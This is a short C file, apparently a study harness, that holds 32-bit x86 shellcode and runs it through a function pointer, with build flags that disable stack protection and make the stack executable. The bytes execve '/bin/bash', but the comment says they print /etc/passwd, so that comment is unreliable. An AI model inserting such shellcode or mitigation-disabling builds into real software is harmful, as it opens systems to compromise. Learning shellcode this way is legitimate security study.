/*
 ShellcodeSkeleton.c
By Ryan
need to remember to pass the -fno-stack-protector 
need to make the stack executable: -z execstack
Don't forget to build for ia32
gcc ShellcodeSkeleton.c -m32 -fno-stack-protector -z execstack -o ShellcodeSkeleton.out
*/

#include <stdio.h>
#include <string.h>

// Example shellcode from http://shell-storm.org/shellcode/files/shellcode-842.php
// prints out the /etc/passwd
unsigned char shellcode[] = \
"\xeb\x1a\x5e\x31\xdb\x88\x5e\x09\x89\x76\x0a\x89\x5e\x0e\x8d\x1e\x8d\x4e\x0a\x8d\x56\x0e\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43";

int main()
{
    printf("Shellcode size: %d\n", strlen(shellcode));
    int (*ret)() = (int(*)())shellcode;
    ret();
}